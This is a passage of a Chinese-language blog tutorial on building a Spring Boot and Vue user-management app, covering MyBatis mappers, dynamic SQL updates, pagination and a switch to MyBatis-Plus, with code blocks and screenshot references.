data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RestController</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token annotation punctuation\">@SpringBootApplication</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SpringbootApplication</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>       <span class=\"token class-name\">SpringApplication</span><span class=\"token punctuation\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SpringbootApplication</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token string\">\"ok\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以成功运行</p>\n<p>把 vue 目录拖入 springboot 目录里，配置 vue 启动方式，点击箭头即可启动 vue 项目</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116223554310.png\" alt=\"image-20240116223554310\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116223529504.png\" alt=\"image-20240116223529504\" /></p>\n<p>前后端部分可以同时运行</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116223801433.png\" alt=\"image-20240116223801433\" /></p>\n<p>创建新表</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116224840893.png\" alt=\"image-20240116224840893\" /></p>\n<p>创建一个元组</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116225020562.png\" alt=\"image-20240116225020562\" /></p>\n<p>回到 IDEA，启动类目录下新建 entity 目录，创建实体类，Alt+Insert 创建 getter setter（<strong>冗余</strong>）</p>\n<p>此处导入<strong> lombok.data</strong> 通过<strong>注解 @Data</strong></p>\n<p>创建 getter，setter 简化代码</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116225642843.png\" alt=\"image-20240116225642843\" /></p>\n<p>创建 mapper 包，新建 UserMapper 接口</p>\n<p>写 sql 查询，加上 @Mapper 注解</p>\n<p>再创建 controller 包，新建 UserController 实现类</p>\n<p>Ctrl+Alt+O 去除无用的包</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117084137569.png\" alt=\"image-20240117084137569\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117084151069.png\" alt=\"image-20240117084151069\" /></p>\n<p>debug 开启服务，刷新 web 界面</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117084701545.png\" alt=\"image-20240117084701545\" /></p>\n<h1 id=\"springboot实现增删改查\"><a class=\"anchor\" href=\"#springboot实现增删改查\">#</a> Springboot 实现增删改查</h1>\n<h2 id=\"新增功能\"><a class=\"anchor\" href=\"#新增功能\">#</a> 新增功能</h2>\n<p>新建接口 ——SQL 语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> sys_user<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span>nickname<span class=\"token punctuation\">,</span>email<span class=\"token punctuation\">,</span>phone<span class=\"token punctuation\">,</span>address<span class=\"token punctuation\">)</span> <span class=\"token keyword\">values</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"Xh1Xxhg\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"XoX\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"X@163.com\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"18888888888\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"浙江\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>SQLyog 执行查询</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117085809227.png\" alt=\"image-20240117085809227\" /></p>\n<p>查询写入 UserMapper</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117090325536.png\" alt=\"image-20240117090325536\" /></p>\n<p>controller 实现插入保存</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117090357111.png\" alt=\"image-20240117090357111\" /></p>\n<p>这里利用 Postman 测试接口</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117091727743.png\" alt=\"image-20240117091727743\" /></p>\n<p>数据库成功插入</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117091701786.png\" alt=\"image-20240117091701786\" /></p>\n<h2 id=\"更新功能\"><a class=\"anchor\" href=\"#更新功能\">#</a> 更新功能</h2>\n<p>新增 + 更新实现需要 service 层</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTMxNDA4NDEvYXJ0aWNsZS9kZXRhaWxzLzEyMDk4MDM4Mg==\">https://blog.csdn.net/u013140841/article/details/120980382</span></p>\n<p>Service</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117100943847.png\" alt=\"image-20240117100943847\" /></p>\n<p>Mapper</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117100958818.png\" alt=\"image-20240117100958818\" /></p>\n<p>controller</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117101055573.png\" alt=\"image-20240117101055573\" /></p>\n<p>邮箱信息更新成功</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117102721678.png\" alt=\"image-20240117102721678\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117100916304.png\" alt=\"image-20240117100916304\" /></p>\n<p><strong>动态 sql—— 不覆盖原有</strong></p>\n<p>安装插件 MybatisX，新建 resources/mapper/User.xml</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117101532371.png\" alt=\"image-20240117101532371\" /></p>\n<p>通过 User.xml 在 namespace 中写全类名连接到一块</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODE5MzcyL2FydGljbGUvZGV0YWlscy83NzE2MDYyNA==\">https://blog.csdn.net/qq_34819372/article/details/77160624</span></p>\n<p><strong>动态 sql 代码</strong></p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">mapper</span> <span class=\"token name\">PUBLIC</span> <span class=\"token string\">\"-//mybatis.org//DTD Mapper 3.0//EN\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token string\">\"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">&lt;!-- mapper 标签都有一个唯一标示，即为命名空间 namespace --></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>mapper</span> <span class=\"token attr-name\">namespace</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>com.xoxbc.springboot.mapper.UserMapper<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>update</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>update<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        UPDATE sys_user</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>set</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>if</span> <span class=\"token attr-name\">test</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username != null<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                username = #&#123;username&#125;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>if</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>if</span> <span class=\"token attr-name\">test</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>nickname != null<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                nickname = #&#123;nickname&#125;,</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>if</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>if</span> <span class=\"token attr-name\">test</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>email != null<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                email = #&#123;email&#125;,</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>if</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>if</span> <span class=\"token attr-name\">test</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>phone != null<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                phone = #&#123;phone&#125;,</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>if</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>if</span> <span class=\"token attr-name\">test</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>address != null<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                address = #&#123;address&#125;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>if</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>set</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>where</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            id = #&#123;id&#125;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>where</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>update</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>mapper</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>成功 send 请求</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117103239221.png\" alt=\"image-20240117103239221\" /></p>\n<p>数据库内容也随之更新</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117103301140.png\" alt=\"image-20240117103301140\" /></p>\n<p>终端打印查询的 sql 语句，在配置中修改</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117103636926.png\" alt=\"image-20240117103636926\" /></p>\n<figure class=\"highlight yaml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">mybatis</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token key atrule\">mapper-locations</span><span class=\"token punctuation\">:</span> classpath<span class=\"token punctuation\">:</span>mapper/<span class=\"token important\">*.xml</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token key atrule\">configuration</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token key atrule\">log-impl</span><span class=\"token punctuation\">:</span> org.apache.ibatis.logging.stdout.StdOutImpl</pre></td></tr></table></figure><p>send 请求</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117103652253.png\" alt=\"image-20240117103652253\" /></p>\n<p>成功更改</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117103711674.png\" alt=\"image-20240117103711674\" /></p>\n<p>sql 语句终端打印</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117103738336.png\" alt=\"image-20240117103738336\" /></p>\n<h2 id=\"删除功能\"><a class=\"anchor\" href=\"#删除功能\">#</a> 删除功能</h2>\n<p>controller</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117104809955.png\" alt=\"image-20240117104809955\" /></p>\n<p>mapper</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117104825637.png\" alt=\"image-20240117104825637\" /></p>\n<p>send 请求</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117104759764.png\" alt=\"image-20240117104759764\" /></p>\n<p>成功删除</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117104856328.png\" alt=\"image-20240117104856328\" /></p>\n<h1 id=\"springboot实现分页查询\"><a class=\"anchor\" href=\"#springboot实现分页查询\">#</a> Springboot 实现分页查询</h1>\n<h2 id=\"不使用框架\"><a class=\"anchor\" href=\"#不使用框架\">#</a> 不使用框架</h2>\n<p>controller</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117111633029.png\" alt=\"image-20240117111633029\" /></p>\n<p>mapper</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117111700430.png\" alt=\"image-20240117111700430\" /></p>\n<p>send 请求成功</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117112300102.png\" alt=\"image-20240117112300102\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117112319792.png\" alt=\"image-20240117112319792\" /></p>\n<p><strong>配置好跨域</strong>，前端访问接口</p>\n<pre><code class=\"language-vue\">created() &#123;\n  // 请求分页查询数据\n  fetch(&quot;http://localhost:9090/user/page?pageNum=1&amp;pageSize=2&quot;).then(res =&gt; res.json()).then(res =&gt; &#123;\n    console.log(res)\n  &#125;)\n&#125;,\n</code></pre>\n<p>成功获取数据</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117123411124.png\" alt=\"image-20240117123411124\" /></p>\n<p>前端返回 json 中<strong>去除密码回显</strong>，利用注解 **@JsonIgnore**</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117123540569.png\" alt=\"image-20240117123540569\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117123705964.png\" alt=\"image-20240117123705964\" /></p>\n<p>之前假数据来源，现在需要替换为交互的真数据</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117124219822.png\" alt=\"image-20240117124219822\" /></p>\n<p>将 tableData 设置为 []，将 res 中数据传入</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117124414911.png\" alt=\"image-20240117124414911\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117124345006.png\" alt=\"image-20240117124345006\" /></p>\n<p>活数据 + ES6 模板字符串 this 指定上下文，return 中需要有返回的变量</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117125751037.png\" alt=\"image-20240117125751037\" /></p>\n<p>页号和每页大小动态绑定通过特定函数与 @注释标注实现</p>\n<p>methods，并将先前 created 的请求语句封装到 load ()</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117133459030.png\" alt=\"image-20240117133459030\" /></p>\n<p>el-pagination 注解</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117133556145.png\" alt=\"image-20240117133556145\" /></p>\n<p>再为接口加入 username 实现<strong>模糊查询</strong></p>\n<p>mapper</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117133257852.png\" alt=\"image-20240117133257852\" /></p>\n<p>controller</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117133325933.png\" alt=\"image-20240117133325933\" /></p>\n<p>成功请求数据（模糊查询）</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117133214285.png\" alt=\"image-20240117133214285\" /></p>\n<h2 id=\"mybatis-plus\"><a class=\"anchor\" href=\"#mybatis-plus\">#</a> Mybatis-Plus</h2>\n<p>配置好版本依赖</p>\n<p>导入分页插件的 config，新建 config/MybatisPlusConfig.java</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DbType</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>extension<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">MybatisPlusInterceptor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>extension<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span>inner<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PaginationInnerInterceptor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>mybatis<span class=\"token punctuation\">.</span>spring<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">MapperScan</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Bean</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Configuration</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token annotation punctuation\">@MapperScan</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.xoxbc.springboot.mapper\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MybatisPlusConfig</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     * 添加分页插件</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MybatisPlusInterceptor</span> <span class=\"token function\">mybatisPlusInterceptor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>       <span class=\"token class-name\">MybatisPlusInterceptor</span> interceptor <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MybatisPlusInterceptor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>       interceptor<span class=\"token punctuation\">.</span><span class=\"token function\">addInnerInterceptor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">PaginationInnerInterceptor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DbType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">MYSQL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 如果配置多个插件，切记分页最后添加</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>       <span class=\"token comment\">//interceptor.addInnerInterceptor (new PaginationInnerInterceptor ()); 如果有多数据源可以不配具体类型 否则都建议配上具体的 DbType</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>       <span class=\"token keyword\">return</span> interceptor<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>选择 3.5.5 合适的版本正确整合后，成功启动运行，发送 send 请求接口也能成功 response，但是 sql 没打印，需要在 application.yml 中更换配置</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117160048859.png\" alt=\"image-20240117160048859\" /></p>\n<p>POST 请求能成功修改数据，读取动态 sql 配置 User.xml</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117160030416.png\" alt=\"image-20240117160030416\" /></p>\n<p>配置好后，修改之前的功能用 Mybatis-Plus 实现</p>\n<p><strong>userservice 继承 ServiceImpl</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117171140678.png\" alt=\"image-20240117171140678\" /></p>\n<p><strong>usermapper 需要继承 